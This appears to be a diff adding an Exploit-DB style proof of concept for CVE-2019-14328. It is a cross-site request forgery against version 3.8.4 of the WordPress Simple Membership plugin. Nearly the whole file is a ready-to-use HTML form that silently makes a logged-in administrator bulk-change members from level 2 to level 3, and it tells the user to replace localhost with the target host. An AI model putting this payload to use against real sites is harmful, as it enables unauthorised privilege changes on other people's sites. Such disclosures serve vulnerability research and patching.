@@ -1,0 +1,24 @@
+# Exploit Title: Cross Site Request Forgery in Wordpress Simple Membership plugin
+# Date: 2019-07-27
+# Exploit Author: rubyman
+# Vendor Homepage: https://wordpress.org/plugins/simple-membership/
+# wpvulndb : https://wpvulndb.com/vulnerabilities/9482
+# Version: 3.8.4
+# Tested on: Windows 8.1
+# CVE : CVE-2019-14328
+
+#
+# Change localhost to your desired host
+#
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://localhost/wordpress/wp-admin/admin.php?page=simple_wp_membership&member_action=bulk" method="POST">
+      <input type="hidden" name="swpm&#95;bulk&#95;change&#95;level&#95;from" value="2" />
+      <input type="hidden" name="swpm&#95;bulk&#95;change&#95;level&#95;to" value="3" />
+      <input type="hidden" name="swpm&#95;bulk&#95;change&#95;level&#95;process" value="Bulk&#32;Change&#32;Membership&#32;Level" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
